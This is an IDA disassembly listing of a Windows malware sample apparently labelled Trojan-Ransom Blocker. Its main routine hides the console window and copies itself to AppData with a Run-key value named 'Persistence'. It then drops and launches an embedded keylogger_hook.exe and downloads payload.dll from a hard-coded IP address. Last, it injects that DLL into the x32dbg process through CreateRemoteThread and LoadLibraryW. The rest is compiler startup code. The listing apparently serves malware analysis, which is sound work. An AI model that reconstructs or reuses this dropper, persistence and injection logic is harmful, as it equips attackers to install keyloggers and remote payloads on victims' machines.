.text:00401000 ;
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ; |      This file was generated by The Interactive Disassembler (IDA)      |
.text:00401000 ; |           Copyright (c) 2026 Hex-Rays, <support@hex-rays.com>           |
.text:00401000 ; |            <error retrieving user info: Invalid input data>             |
.text:00401000 ; +-------------------------------------------------------------------------+
.text:00401000 ;
.text:00401000 ; Input SHA256 : A1858F5E497309FB46ACD71E0DBDC6959975ECE7345FE7B565484547253677F9
.text:00401000 ; Input MD5    : F70B586E3306CD84C29E123A65226196
.text:00401000 ; Input CRC32  : 364FF33F
.text:00401000 ; Compiler     : Visual C++ (guessed)
.text:00401000
.text:00401000 ; File Name   : /home/petik/Downloads/petikvx-archiver/Articles/UDS-Trojan-Ransom.Win32.Blocker.gen/artefacts/blocker_gen.exe
.text:00401000 ; Format      : Portable executable for 80386 (PE)
.text:00401000 ; Imagebase   : 400000
.text:00401000 ; Timestamp   : 673EC1C5 (Thu Nov 21 05:14:45 2024 UTC)
.text:00401000 ; Section 1. (virtual address 00001000)
.text:00401000 ; Virtual size                  : 0000116D (   4461.)
.text:00401000 ; Section size in file          : 00001200 (   4608.)
.text:00401000 ; Offset to raw data for section: 00000400
.text:00401000 ; Flags 60000020: Text Executable Readable
.text:00401000 ; Alignment     : default
.text:00401000 ; OS type         :  MS Windows
.text:00401000 ; Application type:  Executable 32bit
.text:00401000
.text:00401000                 .686p
.text:00401000                 .mmx
.text:00401000                 .model flat
.text:00401000
.text:00401000 ; ===========================================================================
.text:00401000
.text:00401000 ; Segment type: Pure code
.text:00401000 ; Segment permissions: Read/Execute
.text:00401000 _text           segment para public 'CODE' use32
.text:00401000                 assume cs:_text
.text:00401000                 ;org 401000h
.text:00401000                 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
.text:00401000
.text:00401000 ; =============== S U B R O U T I N E =======================================
.text:00401000
.text:00401000
.text:00401000 sub_401000      proc near               ; CODE XREF: sub_401010+1A↓p
.text:00401000                                         ; ___scrt_initialize_default_local_stdio_options↓p
.text:00401000                 mov     eax, offset unk_4053C0
.text:00401005                 retn
.text:00401005 sub_401000      endp
.text:00401005
.text:00401005 ; ---------------------------------------------------------------------------
.text:00401006                 align 10h
.text:00401010
.text:00401010 ; =============== S U B R O U T I N E =======================================
.text:00401010
.text:00401010 ; Attributes: bp-based frame
.text:00401010
.text:00401010 ; int __cdecl sub_401010(char *Format, char ArgList)
.text:00401010 sub_401010      proc near               ; CODE XREF: _main+12D↓p
.text:00401010                                         ; _main+14E↓p ...
.text:00401010
.text:00401010 Format          = dword ptr  8
.text:00401010 ArgList         = byte ptr  0Ch
.text:00401010
.text:00401010                 push    ebp
.text:00401011                 mov     ebp, esp
.text:00401013                 push    esi
.text:00401014                 mov     esi, [ebp+Format]
.text:00401017                 push    1               ; Ix
.text:00401019                 call    ds:__acrt_iob_func ; api-ms-win-crt-stdio-l1-1-0
.text:0040101F                 add     esp, 4
.text:00401022                 lea     ecx, [ebp+ArgList]
.text:00401025                 push    ecx             ; ArgList
.text:00401026                 push    0               ; Locale
.text:00401028                 push    esi             ; Format
.text:00401029                 push    eax             ; Stream
.text:0040102A                 call    sub_401000
.text:0040102F                 push    dword ptr [eax+4]
.text:00401032                 push    dword ptr [eax] ; Options
.text:00401034                 call    ds:__stdio_common_vfprintf ; api-ms-win-crt-stdio-l1-1-0
.text:0040103A                 add     esp, 18h
.text:0040103D                 pop     esi
.text:0040103E                 pop     ebp
.text:0040103F                 retn
.text:0040103F sub_401010      endp
.text:0040103F
.text:00401040
.text:00401040 ; =============== S U B R O U T I N E =======================================
.text:00401040
.text:00401040 ; Attributes: bp-based frame
.text:00401040
.text:00401040 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:00401040 _main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p
.text:00401040
.text:00401040 phkResult       = dword ptr -440h
.text:00401040 pe              = PROCESSENTRY32W ptr -43Ch
.text:00401040 NumberOfBytesWritten= dword ptr -210h
.text:00401040 pszPath         = word ptr -20Ch
.text:00401040 var_4           = dword ptr -4
.text:00401040 argc            = dword ptr  8
.text:00401040 argv            = dword ptr  0Ch
.text:00401040 envp            = dword ptr  10h
.text:00401040
.text:00401040                 push    ebp
.text:00401041                 mov     ebp, esp
.text:00401043                 sub     esp, 440h
.text:00401049                 mov     eax, ___security_cookie
.text:0040104E                 xor     eax, ebp
.text:00401050                 mov     [ebp+var_4], eax
.text:00401053                 push    ebx
.text:00401054                 push    esi
.text:00401055                 push    edi             ; ArgList
.text:00401056                 call    ds:AllocConsole ; KERNEL32
.text:0040105C                 push    0               ; lpWindowName
.text:0040105E                 push    offset ClassName ; "ConsoleWindowClass"
.text:00401063                 call    ds:FindWindowA  ; USER32
.text:00401069                 push    0               ; nCmdShow
.text:0040106B                 push    eax             ; hWnd
.text:0040106C                 call    ds:ShowWindow   ; USER32
.text:00401072                 push    104h            ; nSize
.text:00401077                 lea     eax, [ebp+pe.szExeFile]
.text:0040107D                 push    eax             ; lpFilename
.text:0040107E                 push    0               ; hModule
.text:00401080                 call    ds:GetModuleFileNameW ; KERNEL32
.text:00401086                 push    2               ; dwFileAttributes
.text:00401088                 lea     eax, [ebp+pe.szExeFile]
.text:0040108E                 push    eax             ; lpFileName
.text:0040108F                 call    ds:SetFileAttributesW ; KERNEL32
.text:00401095                 mov     ebx, ds:SHGetFolderPathW ; SHELL32
.text:0040109B                 lea     eax, [ebp+pszPath]
.text:004010A1                 push    eax             ; pszPath
.text:004010A2                 push    0               ; dwFlags
.text:004010A4                 push    0               ; hToken
.text:004010A6                 push    23h ; '#'       ; csidl
.text:004010A8                 push    0               ; hwnd
.text:004010AA                 call    ebx ; SHGetFolderPathW ; SHELL32
.text:004010AC                 mov     esi, ds:wcscat_s ; api-ms-win-crt-string-l1-1-0
.text:004010B2                 lea     eax, [ebp+pszPath]
.text:004010B8                 push    offset Source   ; "\\app_data.exe"
.text:004010BD                 push    104h            ; SizeInWords
.text:004010C2                 push    eax             ; Destination
.text:004010C3                 call    esi ; wcscat_s  ; api-ms-win-crt-string-l1-1-0
.text:004010C5                 add     esp, 0Ch
.text:004010C8                 lea     eax, [ebp+pszPath]
.text:004010CE                 push    0               ; bFailIfExists
.text:004010D0                 push    eax             ; lpNewFileName
.text:004010D1                 lea     eax, [ebp+pe.szExeFile]
.text:004010D7                 push    eax             ; lpExistingFileName
.text:004010D8                 call    ds:CopyFileW    ; KERNEL32
.text:004010DE                 lea     eax, [ebp+pe.szExeFile]
.text:004010E4                 push    eax             ; pszPath
.text:004010E5                 push    0               ; dwFlags
.text:004010E7                 push    0               ; hToken
.text:004010E9                 push    23h ; '#'       ; csidl
.text:004010EB                 push    0               ; hwnd
.text:004010ED                 call    ebx ; SHGetFolderPathW ; SHELL32
.text:004010EF                 push    offset Source   ; "\\app_data.exe"
.text:004010F4                 lea     eax, [ebp+pe.szExeFile]
.text:004010FA                 push    104h            ; SizeInWords
.text:004010FF                 push    eax             ; Destination
.text:00401100                 call    esi ; wcscat_s  ; api-ms-win-crt-string-l1-1-0
.text:00401102                 add     esp, 0Ch
.text:00401105                 lea     eax, [ebp+phkResult]
.text:0040110B                 push    eax             ; phkResult
.text:0040110C                 push    20006h          ; samDesired
.text:00401111                 push    0               ; ulOptions
.text:00401113                 push    offset SubKey   ; "Software\\Microsoft\\Windows\\CurrentVe"...
.text:00401118                 push    80000001h       ; hKey
.text:0040111D                 call    ds:RegOpenKeyExW ; ADVAPI32
.text:00401123                 push    208h            ; cbData
.text:00401128                 lea     eax, [ebp+pe.szExeFile]
.text:0040112E                 push    eax             ; lpData
.text:0040112F                 push    1               ; dwType
.text:00401131                 push    0               ; Reserved
.text:00401133                 push    offset ValueName ; "Persistence"
.text:00401138                 push    [ebp+phkResult] ; hKey
.text:0040113E                 call    ds:RegSetValueExW ; ADVAPI32
.text:00401144                 push    [ebp+phkResult] ; hKey
.text:0040114A                 call    ds:RegCloseKey  ; ADVAPI32
.text:00401150                 push    0Ah             ; lpType
.text:00401152                 push    65h ; 'e'       ; lpName
.text:00401154                 push    0               ; hModule
.text:00401156                 call    ds:FindResourceW ; KERNEL32
.text:0040115C                 mov     ebx, ds:CloseHandle ; KERNEL32
.text:00401162                 mov     edi, eax
.text:00401164                 test    edi, edi
.text:00401166                 jnz     short loc_40117A
.text:00401168                 push    offset Format   ; "FindResource Error\n"
.text:0040116D                 call    sub_401010
.text:00401172                 add     esp, 4
.text:00401175                 jmp     loc_40125B
.text:0040117A ; ---------------------------------------------------------------------------
.text:0040117A
.text:0040117A loc_40117A:                             ; CODE XREF: _main+126↑j
.text:0040117A                 push    edi             ; hResInfo
.text:0040117B                 push    0               ; hModule
.text:0040117D                 call    ds:LoadResource ; KERNEL32
.text:00401183                 mov     esi, eax
.text:00401185                 test    esi, esi
.text:00401187                 jnz     short loc_40119B
.text:00401189                 push    offset aLoadresourceEr ; "LoadResource Error\n"
.text:0040118E                 call    sub_401010
.text:00401193                 add     esp, 4
.text:00401196                 jmp     loc_40125B
.text:0040119B ; ---------------------------------------------------------------------------
.text:0040119B
.text:0040119B loc_40119B:                             ; CODE XREF: _main+147↑j
.text:0040119B                 push    edi             ; hResInfo
.text:0040119C                 push    0               ; hModule
.text:0040119E                 call    ds:SizeofResource ; KERNEL32
.text:004011A4                 push    esi             ; hResData
.text:004011A5                 mov     [ebp+phkResult], eax
.text:004011AB                 call    ds:LockResource ; KERNEL32
.text:004011B1                 mov     edi, eax
.text:004011B3                 test    edi, edi
.text:004011B5                 jnz     short loc_4011C9
.text:004011B7                 push    offset aLockresourceEr ; "LockResource Error\n"
.text:004011BC                 call    sub_401010
.text:004011C1                 add     esp, 4
.text:004011C4                 jmp     loc_40125B
.text:004011C9 ; ---------------------------------------------------------------------------
.text:004011C9
.text:004011C9 loc_4011C9:                             ; CODE XREF: _main+175↑j
.text:004011C9                 lea     eax, [ebp+pszPath]
.text:004011CF                 push    eax             ; pszPath
.text:004011D0                 push    0               ; dwFlags
.text:004011D2                 push    0               ; hToken
.text:004011D4                 push    1Ah             ; csidl
.text:004011D6                 push    0               ; hwnd
.text:004011D8                 call    ds:SHGetFolderPathW ; SHELL32
.text:004011DE                 push    offset aKeyloggerHookE ; "\\keylogger_hook.exe"
.text:004011E3                 lea     eax, [ebp+pszPath]
.text:004011E9                 push    104h            ; SizeInWords
.text:004011EE                 push    eax             ; Destination
.text:004011EF                 call    ds:wcscat_s     ; api-ms-win-crt-string-l1-1-0
.text:004011F5                 add     esp, 0Ch
.text:004011F8                 lea     eax, [ebp+pszPath]
.text:004011FE                 push    0               ; hTemplateFile
.text:00401200                 push    0               ; dwFlagsAndAttributes
.text:00401202                 push    2               ; dwCreationDisposition
.text:00401204                 push    0               ; lpSecurityAttributes
.text:00401206                 push    1               ; dwShareMode
.text:00401208                 push    2               ; dwDesiredAccess
.text:0040120A                 push    eax             ; lpFileName
.text:0040120B                 call    ds:CreateFileW  ; KERNEL32
.text:00401211                 mov     esi, eax
.text:00401213                 cmp     esi, 0FFFFFFFFh
.text:00401216                 jnz     short loc_401227
.text:00401218                 push    offset aCreatefileErro ; "CreateFile Error\n"
.text:0040121D                 call    sub_401010
.text:00401222                 add     esp, 4
.text:00401225                 jmp     short loc_40125B
.text:00401227 ; ---------------------------------------------------------------------------
.text:00401227
.text:00401227 loc_401227:                             ; CODE XREF: _main+1D6↑j
.text:00401227                 push    0               ; lpOverlapped
.text:00401229                 lea     eax, [ebp+NumberOfBytesWritten]
.text:0040122F                 push    eax             ; lpNumberOfBytesWritten
.text:00401230                 push    [ebp+phkResult] ; nNumberOfBytesToWrite
.text:00401236                 push    edi             ; lpBuffer
.text:00401237                 push    esi             ; hFile
.text:00401238                 call    ds:WriteFile    ; KERNEL32
.text:0040123E                 push    esi             ; hObject
.text:0040123F                 call    ebx ; CloseHandle ; KERNEL32
.text:00401241                 push    0Ah             ; nShowCmd
.text:00401243                 push    0               ; lpDirectory
.text:00401245                 push    0               ; lpParameters
.text:00401247                 lea     eax, [ebp+pszPath]
.text:0040124D                 push    eax             ; lpFile
.text:0040124E                 push    offset Operation ; "open"
.text:00401253                 push    0               ; hwnd
.text:00401255                 call    ds:ShellExecuteW ; SHELL32
.text:0040125B
.text:0040125B loc_40125B:                             ; CODE XREF: _main+135↑j
.text:0040125B                                         ; _main+156↑j ...
.text:0040125B                 push    0               ; LPBINDSTATUSCALLBACK
.text:0040125D                 push    0               ; DWORD
.text:0040125F                 push    offset aCPayloadDll ; "C:\\payload.dll"
.text:00401264                 push    offset aHttp2101251017 ; "http://210.125.101.75/payload.dll"
.text:00401269                 push    0               ; LPUNKNOWN
.text:0040126B                 call    ds:URLDownloadToFileW ; urlmon
.text:00401271                 push    228h            ; Size
.text:00401276                 lea     eax, [ebp+pe.cntUsage]
.text:0040127C                 mov     [ebp+phkResult], 0FFFFFFFFh
.text:00401286                 push    0               ; Val
.text:00401288                 push    eax             ; void *
.text:00401289                 call    memset
.text:0040128E                 add     esp, 0Ch
.text:00401291                 mov     [ebp+pe.dwSize], 22Ch
.text:0040129B                 push    0               ; th32ProcessID
.text:0040129D                 push    2               ; dwFlags
.text:0040129F                 call    ds:CreateToolhelp32Snapshot ; KERNEL32
.text:004012A5                 mov     esi, eax
.text:004012A7                 lea     eax, [ebp+pe]
.text:004012AD                 push    eax             ; lppe
.text:004012AE                 push    esi             ; hSnapshot
.text:004012AF                 call    ds:Process32FirstW ; KERNEL32
.text:004012B5                 test    eax, eax
.text:004012B7                 jz      short loc_401307
.text:004012B9                 mov     edi, ds:_wcsicmp ; api-ms-win-crt-string-l1-1-0
.text:004012BF                 mov     ebx, ds:Process32NextW ; KERNEL32
.text:004012C5                 db      66h, 66h
.text:004012C5                 nop     word ptr [eax+eax+00000000h]
.text:004012D0
.text:004012D0 loc_4012D0:                             ; CODE XREF: _main+2B1↓j
.text:004012D0                 lea     eax, [ebp+pe.szExeFile]
.text:004012D6                 push    eax             ; String2
.text:004012D7                 push    offset String1  ; "x32dbg.exe"
.text:004012DC                 call    edi ; _wcsicmp  ; api-ms-win-crt-string-l1-1-0
.text:004012DE                 add     esp, 8
.text:004012E1                 test    eax, eax
.text:004012E3                 jz      short loc_4012F5
.text:004012E5                 lea     eax, [ebp+pe]
.text:004012EB                 push    eax             ; lppe
.text:004012EC                 push    esi             ; hSnapshot
.text:004012ED                 call    ebx ; Process32NextW ; KERNEL32
.text:004012EF                 test    eax, eax
.text:004012F1                 jnz     short loc_4012D0
.text:004012F3                 jmp     short loc_401301
.text:004012F5 ; ---------------------------------------------------------------------------
.text:004012F5
.text:004012F5 loc_4012F5:                             ; CODE XREF: _main+2A3↑j
.text:004012F5                 mov     eax, [ebp+pe.th32ProcessID]
.text:004012FB                 mov     [ebp+phkResult], eax
.text:00401301
.text:00401301 loc_401301:                             ; CODE XREF: _main+2B3↑j
.text:00401301                 mov     ebx, ds:CloseHandle ; KERNEL32
.text:00401307
.text:00401307 loc_401307:                             ; CODE XREF: _main+277↑j
.text:00401307                 push    esi             ; hObject
.text:00401308                 call    ebx ; CloseHandle ; KERNEL32
.text:0040130A                 push    [ebp+phkResult] ; dwProcessId
.text:00401310                 push    0               ; bInheritHandle
.text:00401312                 push    1FFFFFh         ; dwDesiredAccess
.text:00401317                 call    ds:OpenProcess  ; KERNEL32
.text:0040131D                 push    4               ; flProtect
.text:0040131F                 push    3000h           ; flAllocationType
.text:00401324                 push    1Eh             ; dwSize
.text:00401326                 mov     edi, eax
.text:00401328                 push    0               ; lpAddress
.text:0040132A                 push    edi             ; hProcess
.text:0040132B                 call    ds:VirtualAllocEx ; KERNEL32
.text:00401331                 push    0               ; lpNumberOfBytesWritten
.text:00401333                 push    1Eh             ; nSize
.text:00401335                 push    offset aCPayloadDll_0 ; "C:\\payload.dll"
.text:0040133A                 mov     esi, eax
.text:0040133C                 push    esi             ; lpBaseAddress
.text:0040133D                 push    edi             ; hProcess
.text:0040133E                 call    ds:WriteProcessMemory ; KERNEL32
.text:00401344                 push    offset ModuleName ; "kernel32.dll"
.text:00401349                 call    ds:GetModuleHandleW ; KERNEL32
.text:0040134F                 push    offset ProcName ; "LoadLibraryW"
.text:00401354                 push    eax             ; hModule
.text:00401355                 call    ds:GetProcAddress ; KERNEL32
.text:0040135B                 push    0               ; lpThreadId
.text:0040135D                 push    0               ; dwCreationFlags
.text:0040135F                 push    esi             ; lpParameter
.text:00401360                 push    eax             ; lpStartAddress
.text:00401361                 push    0               ; dwStackSize
.text:00401363                 push    0               ; lpThreadAttributes
.text:00401365                 push    edi             ; hProcess
.text:00401366                 call    ds:CreateRemoteThread ; KERNEL32
.text:0040136C                 push    eax             ; hObject
.text:0040136D                 call    ebx ; CloseHandle ; KERNEL32
.text:0040136F                 push    8000h           ; dwFreeType
.text:00401374                 push    1Eh             ; dwSize
.text:00401376                 push    esi             ; lpAddress
.text:00401377                 push    edi             ; hProcess
.text:00401378                 call    ds:VirtualFreeEx ; KERNEL32
.text:0040137E                 push    edi             ; hObject
.text:0040137F                 call    ebx ; CloseHandle ; KERNEL32
.text:00401381                 mov     ecx, [ebp+var_4]
.text:00401384                 xor     eax, eax
.text:00401386                 pop     edi
.text:00401387                 pop     esi
.text:00401388                 xor     ecx, ebp        ; StackCookie
.text:0040138A                 pop     ebx
.text:0040138B                 call    @__security_check_cookie@4 ; __security_check_cookie(x)
.text:00401390                 mov     esp, ebp
.text:00401392                 pop     ebp
.text:00401393                 retn
.text:00401393 _main           endp
.text:00401393
.text:00401394 ; [0000000E BYTES: COLLAPSED FUNCTION __security_check_cookie(x)]
.text:004013A2 ; [000000AB BYTES: COLLAPSED FUNCTION pre_c_initialization(void)]
.text:0040144D
.text:0040144D ; =============== S U B R O U T I N E =======================================
.text:0040144D
.text:0040144D
.text:0040144D sub_40144D      proc near               ; DATA XREF: .rdata:0040316C↓o
.text:0040144D                 call    ___scrt_initialize_default_local_stdio_options
.text:00401452                 xor     eax, eax
.text:00401454                 retn
.text:00401454 sub_40144D      endp
.text:00401454
.text:00401455
.text:00401455 ; =============== S U B R O U T I N E =======================================
.text:00401455
.text:00401455
.text:00401455 sub_401455      proc near               ; DATA XREF: .rdata:0040315C↓o
.text:00401455                 call    sub_401BD6
.text:0040145A                 call    UserMathErrorFunction
.text:0040145F                 push    eax             ; NewMode
.text:00401460                 call    _set_new_mode
.text:00401465                 pop     ecx
.text:00401466                 retn
.text:00401466 sub_401455      endp
.text:00401466
.text:00401467 ; [00000182 BYTES: COLLAPSED FUNCTION __scrt_common_main_seh(void)]
.text:004015E9 ; [0000000A BYTES: COLLAPSED FUNCTION start]
.text:004015F3 ; [00000028 BYTES: COLLAPSED FUNCTION ___raise_securityfailure]
.text:0040161B ; [000000FB BYTES: COLLAPSED FUNCTION ___report_gsfailure]
.text:00401716 ; [00000044 BYTES: COLLAPSED FUNCTION find_pe_section(uchar * const,uint)]
.text:0040175A ; [00000032 BYTES: COLLAPSED FUNCTION ___scrt_acquire_startup_lock]
.text:0040178C ; [00000039 BYTES: COLLAPSED FUNCTION ___scrt_initialize_crt]
.text:004017C5 ; [00000087 BYTES: COLLAPSED FUNCTION ___scrt_initialize_onexit_tables]
.text:0040184C ; [00000094 BYTES: COLLAPSED FUNCTION ___scrt_is_nonwritable_in_current_image]
.text:004018E0 ; [0000001D BYTES: COLLAPSED FUNCTION ___scrt_release_startup_lock]
.text:004018FD ; [00000028 BYTES: COLLAPSED FUNCTION ___scrt_uninitialize_crt]
.text:00401925 ; [0000002D BYTES: COLLAPSED FUNCTION __onexit]
.text:00401952 ; [00000015 BYTES: COLLAPSED FUNCTION _atexit]
.text:00401967 ; [0000004D BYTES: COLLAPSED FUNCTION ___get_entropy]
.text:004019B4 ; [0000004B BYTES: COLLAPSED FUNCTION ___security_init_cookie]
.text:004019FF
.text:004019FF ; =============== S U B R O U T I N E =======================================
.text:004019FF
.text:004019FF
.text:004019FF ; int __cdecl UserMathErrorFunction(struct _exception *)
.text:004019FF UserMathErrorFunction proc near         ; CODE XREF: pre_c_initialization(void)+13↑p
.text:004019FF                                         ; pre_c_initialization(void)+7A↑p ...
.text:004019FF                 xor     eax, eax
.text:00401A01                 retn
.text:00401A01 UserMathErrorFunction endp
.text:00401A01
.text:00401A02
.text:00401A02 ; =============== S U B R O U T I N E =======================================
.text:00401A02
.text:00401A02
.text:00401A02 sub_401A02      proc near               ; CODE XREF: pre_c_initialization(void)+41↑p
.text:00401A02                 xor     eax, eax
.text:00401A04                 inc     eax
.text:00401A05                 retn
.text:00401A05 sub_401A02      endp
.text:00401A05
.text:00401A06 ; [00000006 BYTES: COLLAPSED FUNCTION __get_startup_file_mode]
.text:00401A0C
.text:00401A0C ; =============== S U B R O U T I N E =======================================
.text:00401A0C
.text:00401A0C
.text:00401A0C sub_401A0C      proc near               ; CODE XREF: pre_c_initialization(void)+52↑p
.text:00401A0C                 push    offset ListHead ; ListHead
.text:00401A11                 call    ds:InitializeSListHead ; KERNEL32
.text:00401A17                 retn
.text:00401A17 sub_401A0C      endp
.text:00401A17
.text:00401A18
.text:00401A18 ; =============== S U B R O U T I N E =======================================
.text:00401A18
.text:00401A18
.text:00401A18 sub_401A18      proc near               ; CODE XREF: pre_c_initialization(void)+86↑p
.text:00401A18                                         ; ___scrt_initialize_crt+15↑p ...
.text:00401A18                 mov     al, 1
.text:00401A1A                 retn
.text:00401A1A sub_401A18      endp
.text:00401A1A
.text:00401A1B ; [00000021 BYTES: COLLAPSED FUNCTION __initialize_default_precision]
.text:00401A3C ; [00000003 BYTES: COLLAPSED FUNCTION nullsub_1]
.text:00401A3F
.text:00401A3F ; =============== S U B R O U T I N E =======================================
.text:00401A3F
.text:00401A3F
.text:00401A3F sub_401A3F      proc near               ; CODE XREF: ___scrt_initialize_default_local_stdio_options+E↓p
.text:00401A3F                 mov     eax, offset unk_4053A8
.text:00401A44                 retn
.text:00401A44 sub_401A3F      endp
.text:00401A44
.text:00401A45 ; [0000001D BYTES: COLLAPSED FUNCTION ___scrt_initialize_default_local_stdio_options]
.text:00401A62
.text:00401A62 ; =============== S U B R O U T I N E =======================================
.text:00401A62
.text:00401A62
.text:00401A62 sub_401A62      proc near               ; CODE XREF: pre_c_initialization(void)+57↑p
.text:00401A62                 xor     eax, eax
.text:00401A64                 cmp     dword_405048, eax
.text:00401A6A                 setz    al
.text:00401A6D                 retn
.text:00401A6D sub_401A62      endp
.text:00401A6D
.text:00401A6E
.text:00401A6E ; =============== S U B R O U T I N E =======================================
.text:00401A6E
.text:00401A6E
.text:00401A6E sub_401A6E      proc near               ; CODE XREF: __scrt_common_main_seh(void)+98↑p
.text:00401A6E                 mov     eax, offset unk_4053CC
.text:00401A73                 retn
.text:00401A73 sub_401A6E      endp
.text:00401A73
.text:00401A74
.text:00401A74 ; =============== S U B R O U T I N E =======================================
.text:00401A74
.text:00401A74
.text:00401A74 sub_401A74      proc near               ; CODE XREF: __scrt_common_main_seh(void):loc_401527↑p
.text:00401A74                 mov     eax, offset unk_4053C8
.text:00401A79                 retn
.text:00401A79 sub_401A74      endp
.text:00401A79
.text:00401A7A ; [00000115 BYTES: COLLAPSED FUNCTION ___scrt_fastfail]
.text:00401B8F ; [00000005 BYTES: COLLAPSED FUNCTION j_UserMathErrorFunction]
.text:00401B94 ; [00000042 BYTES: COLLAPSED FUNCTION ___scrt_is_managed_app]
.text:00401BD6
.text:00401BD6 ; =============== S U B R O U T I N E =======================================
.text:00401BD6
.text:00401BD6
.text:00401BD6 sub_401BD6      proc near               ; CODE XREF: sub_401455↑p
.text:00401BD6                 push    offset ___scrt_unhandled_exception_filter@4 ; lpTopLevelExceptionFilter
.text:00401BDB                 call    ds:SetUnhandledExceptionFilter ; KERNEL32
.text:00401BE1                 retn
.text:00401BE1 sub_401BD6      endp
.text:00401BE1
.text:00401BE2 ; [00000055 BYTES: COLLAPSED FUNCTION __scrt_unhandled_exception_filter(x)]
.text:00401C37                 align 4
.text:00401C38
.text:00401C38 ; =============== S U B R O U T I N E =======================================
.text:00401C38
.text:00401C38
.text:00401C38 sub_401C38      proc near               ; CODE XREF: ___scrt_fastfail+1D↑p
.text:00401C38                                         ; ___scrt_fastfail+10C↑p
.text:00401C38                 and     dword_4053B0, 0
.text:00401C3F                 retn
.text:00401C3F sub_401C38      endp
.text:00401C3F
.text:00401C40
.text:00401C40 ; =============== S U B R O U T I N E =======================================
.text:00401C40
.text:00401C40
.text:00401C40 sub_401C40      proc near               ; CODE XREF: pre_c_initialization(void)+32↑p
.text:00401C40                 push    ebx
.text:00401C41                 push    esi
.text:00401C42                 mov     esi, offset unk_403818
.text:00401C47                 mov     ebx, offset unk_403818
.text:00401C4C                 cmp     esi, ebx
.text:00401C4E                 jnb     short loc_401C69
.text:00401C50                 push    edi
.text:00401C51
.text:00401C51 loc_401C51:                             ; CODE XREF: sub_401C40+26↓j
.text:00401C51                 mov     edi, [esi]
.text:00401C53                 test    edi, edi
.text:00401C55                 jz      short loc_401C61
.text:00401C57                 mov     ecx, edi
.text:00401C59                 call    ds:___guard_check_icall_fptr
.text:00401C5F                 call    edi
.text:00401C61
.text:00401C61 loc_401C61:                             ; CODE XREF: sub_401C40+15↑j
.text:00401C61                 add     esi, 4
.text:00401C64                 cmp     esi, ebx
.text:00401C66                 jb      short loc_401C51
.text:00401C68                 pop     edi
.text:00401C69
.text:00401C69 loc_401C69:                             ; CODE XREF: sub_401C40+E↑j
.text:00401C69                 pop     esi
.text:00401C6A                 pop     ebx
.text:00401C6B                 retn
.text:00401C6B sub_401C40      endp
.text:00401C6B
.text:00401C6C
.text:00401C6C ; =============== S U B R O U T I N E =======================================
.text:00401C6C
.text:00401C6C
.text:00401C6C ; void __cdecl sub_401C6C()
.text:00401C6C sub_401C6C      proc near               ; DATA XREF: pre_c_initialization(void)+37↑o
.text:00401C6C                 push    ebx
.text:00401C6D                 push    esi
.text:00401C6E                 mov     esi, offset unk_403820
.text:00401C73                 mov     ebx, offset unk_403820
.text:00401C78                 cmp     esi, ebx
.text:00401C7A                 jnb     short loc_401C95
.text:00401C7C                 push    edi
.text:00401C7D
.text:00401C7D loc_401C7D:                             ; CODE XREF: sub_401C6C+26↓j
.text:00401C7D                 mov     edi, [esi]
.text:00401C7F                 test    edi, edi
.text:00401C81                 jz      short loc_401C8D
.text:00401C83                 mov     ecx, edi
.text:00401C85                 call    ds:___guard_check_icall_fptr
.text:00401C8B                 call    edi
.text:00401C8D
.text:00401C8D loc_401C8D:                             ; CODE XREF: sub_401C6C+15↑j
.text:00401C8D                 add     esi, 4
.text:00401C90                 cmp     esi, ebx
.text:00401C92                 jb      short loc_401C7D
.text:00401C94                 pop     edi
.text:00401C95
.text:00401C95 loc_401C95:                             ; CODE XREF: sub_401C6C+E↑j
.text:00401C95                 pop     esi
.text:00401C96                 pop     ebx
.text:00401C97                 retn
.text:00401C97 sub_401C6C      endp
.text:00401C97
.text:00401C97 ; ---------------------------------------------------------------------------
.text:00401C98                 align 10h
.text:00401CA0 ; [00000045 BYTES: COLLAPSED FUNCTION __SEH_prolog4]
.text:00401CE5 ; [0000002F BYTES: COLLAPSED FUNCTION __except_handler4]
.text:00401D14
.text:00401D14 ; =============== S U B R O U T I N E =======================================
.text:00401D14
.text:00401D14 ; Attributes: bp-based frame
.text:00401D14
.text:00401D14 sub_401D14      proc near               ; CODE XREF: ___scrt_initialize_crt:loc_40179C↑p
.text:00401D14
.text:00401D14 var_28          = dword ptr -28h
.text:00401D14 var_24          = dword ptr -24h
.text:00401D14 var_20          = dword ptr -20h
.text:00401D14 var_1C          = dword ptr -1Ch
.text:00401D14 var_18          = dword ptr -18h
.text:00401D14 var_14          = dword ptr -14h
.text:00401D14 var_10          = dword ptr -10h
.text:00401D14 var_C           = dword ptr -0Ch
.text:00401D14 var_8           = dword ptr -8
.text:00401D14 var_4           = dword ptr -4
.text:00401D14
.text:00401D14                 push    ebp
.text:00401D15                 mov     ebp, esp
.text:00401D17                 and     dword_4053B8, 0
.text:00401D1E                 sub     esp, 28h
.text:00401D21                 or      dword_405058, 1
.text:00401D28                 push    0Ah             ; ProcessorFeature
.text:00401D2A                 call    ds:IsProcessorFeaturePresent ; KERNEL32
.text:00401D30                 test    eax, eax
.text:00401D32                 jz      loc_40203D
.text:00401D38                 push    ebx
.text:00401D39                 push    esi
.text:00401D3A                 push    edi
.text:00401D3B                 xor     eax, eax
.text:00401D3D                 lea     edi, [ebp+var_28]
.text:00401D40                 xor     ecx, ecx
.text:00401D42                 push    ebx
.text:00401D43                 cpuid
.text:00401D45                 mov     esi, ebx
.text:00401D47                 pop     ebx
.text:00401D48                 nop
.text:00401D49                 mov     [edi], eax
.text:00401D4B                 mov     [edi+4], esi
.text:00401D4E                 mov     [edi+8], ecx
.text:00401D51                 xor     ecx, ecx
.text:00401D53                 mov     [edi+0Ch], edx
.text:00401D56                 mov     eax, [ebp+var_28]
.text:00401D59                 mov     edi, [ebp+var_24]
.text:00401D5C                 mov     [ebp+var_4], eax
.text:00401D5F                 xor     edi, 756E6547h
.text:00401D65                 mov     eax, [ebp+var_1C]
.text:00401D68                 xor     eax, 49656E69h
.text:00401D6D                 mov     [ebp+var_18], eax
.text:00401D70                 mov     eax, [ebp+var_20]
.text:00401D73                 xor     eax, 6C65746Eh
.text:00401D78                 mov     [ebp+var_14], eax
.text:00401D7B                 xor     eax, eax
.text:00401D7D                 inc     eax
.text:00401D7E                 push    ebx
.text:00401D7F                 cpuid
.text:00401D81                 mov     esi, ebx
.text:00401D83                 pop     ebx
.text:00401D84                 nop
.text:00401D85                 lea     ebx, [ebp+var_28]
.text:00401D88                 mov     [ebx], eax
.text:00401D8A                 mov     eax, [ebp+var_18]
